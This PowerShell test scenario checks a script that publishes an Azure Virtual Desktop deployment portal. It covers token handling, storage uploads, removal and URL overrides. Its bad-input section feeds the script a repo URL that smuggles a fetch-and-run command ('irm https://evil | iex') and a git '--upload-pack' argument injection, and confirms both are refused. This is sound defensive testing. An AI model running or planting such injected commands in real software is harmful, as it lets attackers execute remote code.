# The deployment portal published into the subscription (Publish-AvdPortal.ps1, decision 0017):
# the region and policy preflight, Static Web Apps (token never printed, reset after the upload,
# invited-only sign-in), the storage static website (content types, the upload role's delay, old
# files removed), the pinned repo and ref in portal-config.js, and -Remove. Red team PH-1..PH-6.
. (Join-Path $PSScriptRoot 'Initialize-OfflineScenario.ps1')
$lz = @{ NamePrefix = 'avdlz'; Environment = 'dev' }
$fork = @{ RepoUrl = 'https://github.com/contoso/avd-landing-zone'; Ref = 'v1.2.0' }
$deploys = { @($global:Calls | Where-Object { $_ -match '^deploy avdlz-portal-' }) }
$cfgOf = { param($text) if ($text -match 'window\.AVDLZ_PORTAL_CONFIG = (\{.*\});') { $Matches[1] | ConvertFrom-Json } }

# ---- Static Web Apps where the landing zone's allowed-locations policy blocks every Static Web Apps region ----
$global:St.allowedLocations = @('northcentralus')
$global:Calls.Clear(); $global:LASTEXITCODE = 0
$blocked = & ./scripts/ops/Publish-AvdPortal.ps1 @lz @fork -Location northcentralus 6>&1 | Out-String
Write-Host "RESULT swa-blocked exit=$LASTEXITCODE deploys=$((& $deploys).Count) storageNamed=$($blocked -match '-Hosting Storage') policyNamed=$($blocked -match 'allowed-locations policy')"

# ---- Static Web Apps, invited users only, for a fork at a tag ----
$global:St.allowedLocations = @('eastus2')
$global:Calls.Clear(); $global:LASTEXITCODE = 0
$swa = & ./scripts/ops/Publish-AvdPortal.ps1 @lz @fork -Location eastus2 -RequireSignIn 6>&1 | Out-String
$u = $global:St.swaUpload; $c = & $cfgOf $u.Config; $sc = $u.SwaConfig | ConvertFrom-Json
$npxAt = [array]::FindIndex([string[]]$global:Calls, [Predicate[string]] { param($x) $x -match '^npx ' })
$resetAt = [array]::FindIndex([string[]]$global:Calls, [Predicate[string]] { param($x) $x -match 'resetapikey' })
$routes = @($sc.routes | ForEach-Object { "$($_.route)=$((@($_.allowedRoles) + @($_.statusCode) | Where-Object { $_ }) -join '+')" }) -join ','
Write-Host ("RESULT swa exit={0} deploy={1} pinned={2} tokenPassed={3} tokenCleared={4} resetAfterUpload={5} tokenPrinted={6} repo={7} ref={8} hosting={9} routes={10} csp={11} frames={12} invited={13} files={14}" -f
  $LASTEXITCODE, ((& $deploys) -join ';' -replace '^deploy \S+ ', ''), ($u.Args[1] -eq '@azure/static-web-apps-cli@2.1.0'), ($global:Calls -match '^npx .*tokenSet=True').Count,
  (-not $env:SWA_CLI_DEPLOYMENT_TOKEN), ($npxAt -ge 0 -and $resetAt -gt $npxAt), ($swa -match [regex]::Escape($global:St.swaToken)), $c.repoUrl, $c.ref, $c.hosting, $routes,
  ($sc.globalHeaders.'Content-Security-Policy' -match "frame-ancestors 'none'"), $sc.globalHeaders.'X-Frame-Options',
  "$($global:St.swaInvitation.properties.roles)/$($global:St.swaInvitation.properties.provider)/$($global:St.swaInvitation.properties.userDetails)",
  ((@('index.html', 'portal/index.html', 'portal/portal-config.js', 'assets/avd-ops.css', 'staticwebapp.config.json', 'denied.html') | Where-Object { $u.Files -contains $_ }).Count))
Write-Host "RESULT swa-url printed=$($swa -match [regex]::Escape("`$env:AVD_PORTAL_URL = 'https://$($global:St.swaHost)/portal/'")) portalUrl=$($c.portalUrl)"

# ---- Static Web Apps without sign-in: headers only; this checkout's origin and commit ----
$global:Calls.Clear()
Invoke-ScenarioStep 'swa-open' { & ./scripts/ops/Publish-AvdPortal.ps1 @lz -Location eastus2 }
$c = & $cfgOf $global:St.swaUpload.Config; $sc = $global:St.swaUpload.SwaConfig | ConvertFrom-Json
Write-Host "RESULT swa-open-state routes=$(@($sc.routes | Where-Object { $_ }).Count) commitRef=$($c.ref -match '^[0-9a-f]{40}$') githubRepo=$($c.repoUrl -match '^https://github\.com/[^/]+/[^/]+$') invitations=$(@($global:Calls | Where-Object { $_ -match 'createUserInvitation' }).Count)"

# ---- A plan someone switched to Standard is reported, never changed; a failed upload still resets the token ----
$global:St.swaSku = 'Standard'; $global:St.swaFail = $true; $global:St.swaTokenResets = 0
$global:Calls.Clear(); $global:LASTEXITCODE = 0
$failed = & ./scripts/ops/Publish-AvdPortal.ps1 @lz @fork -Location eastus2 6>&1 | Out-String
Write-Host "RESULT swa-fail exit=$LASTEXITCODE resets=$($global:St.swaTokenResets) paidWarned=$($failed -match 'Standard plan, which is billed') errorShown=$($failed -match 'content server rejected') planChanged=$(@($global:Calls | Where-Object { $_ -match 'ARM (PUT|PATCH) .*staticSites' }).Count)"
$global:St.swaSku = $null; $global:St.swaFail = $false

# ---- Storage static website in the landing zone's region: the upload role takes a while ----
$global:St.allowedLocations = @('northcentralus')
$global:St.webBlobs = @{ 'old.html' = @{ ContentType = 'text/html' } }
$global:St.blobForbidden = 2
$global:Calls.Clear(); $global:LASTEXITCODE = 0
$storeOut = & ./scripts/ops/Publish-AvdPortal.ps1 @lz @fork -Location northcentralus -Hosting Storage 6>&1 | Out-String
$b = $global:St.webBlobs; $c = & $cfgOf $b['portal/portal-config.js'].Text
Write-Host ("RESULT storage exit={0} deploy={1} website={2} html={3} js={4} font={5} svg={6} oldRemoved={7} retried={8} npx={9} secrets={10} ref={11} anyoneNote={12}" -f
  $LASTEXITCODE, ((& $deploys) -join ';' -replace '^deploy \S+ ', ''), $global:St.staticWebsite, $b['portal/index.html'].ContentType, $b['portal/portal-core.js'].ContentType,
  (@($b.Keys | Where-Object { $_ -like '*.woff2' } | ForEach-Object { $b[$_].ContentType } | Select-Object -Unique) -join '|'), $b['assets/brand/mark.svg'].ContentType,
  (-not $b.ContainsKey('old.html')), ($storeOut -match 'role isn''t active yet'), @($global:Calls | Where-Object { $_ -match '^npx ' }).Count,
  @($global:Calls | Where-Object { $_ -match 'listSecrets' }).Count, $c.ref, ($storeOut -match 'Anyone with this URL'))

# ---- Bad input never reaches a command or a resource ----
$global:Calls.Clear(); $global:LASTEXITCODE = 0
$bad = @(
  { & ./scripts/ops/Publish-AvdPortal.ps1 @lz -Location eastus2 -RepoUrl 'https://github.com/x/y; irm https://evil | iex' -Ref v1 },
  { & ./scripts/ops/Publish-AvdPortal.ps1 @lz -Location eastus2 -RepoUrl 'https://github.com/x/y' -Ref '--upload-pack=x' },
  { & ./scripts/ops/Publish-AvdPortal.ps1 @lz @fork -Location northcentralus -Hosting Storage -RequireSignIn }
) | ForEach-Object { try { & $_ 6>&1 | Out-Null; 'ran' } catch { 'refused' } }
Write-Host "RESULT bad-input $($bad -join ',') deploys=$((& $deploys).Count)"

# ---- -Remove, twice ----
$global:Calls.Clear()
Invoke-ScenarioStep 'remove' { & ./scripts/ops/Publish-AvdPortal.ps1 @lz -Location eastus2 -Remove }
Invoke-ScenarioStep 'remove-again' { & ./scripts/ops/Publish-AvdPortal.ps1 @lz -Location eastus2 -Remove }
Write-Host "RESULT remove deleted=$(@($global:Calls | Where-Object { $_ -eq 'del rg rg-avdlz-dev-portal' }).Count)"

# ---- The scripts name the portal: GitHub Pages unless AVD_PORTAL_URL says otherwise ----
Import-Module ./scripts/ops/AvdLandingZone.psm1 -Force
$state = Get-AvdPortalState -Stage predeploy
$env:AVD_PORTAL_URL = $null
$default = Write-AvdPortalState -State $state 6>&1 | Out-String
$env:AVD_PORTAL_URL = "https://$($global:St.swaHost)/portal/"
$own = Write-AvdPortalState -State $state 6>&1 | Out-String
$env:AVD_PORTAL_URL = 'http://phish.example/portal/'
$plain = Write-AvdPortalState -State $state 6>&1 | Out-String
$env:AVD_PORTAL_URL = $null
Write-Host ("RESULT portal-url default={0} hostNamed={1} override={2} httpIgnored={3}" -f ($default -match 'deploy\.avd-ops\.dev' -and $default -notmatch 'Portal host:'),
  ($own -match "Portal host: $([regex]::Escape($global:St.swaHost)), set by AVD_PORTAL_URL"), ($own -match "paste this output into https://$([regex]::Escape($global:St.swaHost))/portal/"),
  ($plain -match 'deploy\.avd-ops\.dev' -and $plain -notmatch 'phish'))
